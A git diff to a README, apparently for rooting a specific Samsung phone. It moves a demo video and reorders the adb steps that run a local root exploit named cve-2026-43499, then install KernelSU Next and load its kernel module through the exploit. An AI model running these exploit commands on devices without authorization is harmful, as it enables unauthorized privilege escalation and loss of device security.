@@ -16,12 +16,12 @@ All credit goes to the respective authors.
 - Baseband : M556BXXU4AYB4,M556BXXU4AYB4
 - Kernel : 5.10.226-android12-9-28566349-abM556BXXU4AYB4
 
-<video src="https://github.com/user-attachments/assets/b9338240-abbc-4eee-b269-9cc6ebf4375f" width="100%" controls autoplay muted></video>
-
 <table>
   <tr>
     <td><img src="https://github.com/user-attachments/assets/3410b40f-1e09-4f9b-8c1a-dc1c64826185"width="300"></td>
     <td><img src="https://github.com/user-attachments/assets/1502c646-a739-4be6-8b91-995a57185f6a" width="300"></td>
+
+<td><video src="https://github.com/user-attachments/assets/b9338240-abbc-4eee-b269-9cc6ebf4375f" width="100%" controls autoplay muted></video></td>
   </tr>
 </table>
 
@@ -130,16 +130,14 @@ Run the exploit via adb:
 adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
 adb shell "/data/local/tmp/cve-2026-43499-root"
 adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
+adb install KernelSU_Next_v3.3.0-release.apk
+adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
+adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"
 ```
 Or use TonySamaaaa script on device side via Termux Wireless debug(exploit.sh):
 ```sh
 adb push exploit.sh /data/local/tmp/exploit.sh
 adb shell sh /data/local/tmp/exploit.sh
-```sh
-```sh
-adb install KernelSU_Next_v3.3.0-release.apk
-adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
-adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"
 ```
 
 
